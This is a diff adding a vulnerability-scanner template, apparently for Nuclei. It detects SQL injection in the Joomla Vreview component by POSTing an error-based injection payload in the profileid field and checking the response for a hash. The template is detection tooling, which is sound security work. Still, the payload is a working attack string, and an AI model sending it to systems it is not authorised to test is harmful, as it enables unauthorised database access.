@@ -1,0 +1,24 @@
+id: joomla-component-vreview-sql
+info:
+  name: Joomla Component Vreview SQL Injection
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection,joomla
+  description: |
+    SQL Injection vulnerability in Joomla Component Vreview that allows attackers to execute arbitrary SQL commands.
+variables:
+  random_value: "{{rand_int(10000, 21000)}}"
+http:
+  - method: POST
+    path:
+      - "/index.php?option=com_vreview&task=displayReply"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: | 
+      profileid=-8511 OR 1 GROUP BY CONCAT(0x7e,md5({{random_value}}),0x7e,FLOOR(RAND()*2)) HAVING MIN(0)#
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(to_string(random_value))}}"
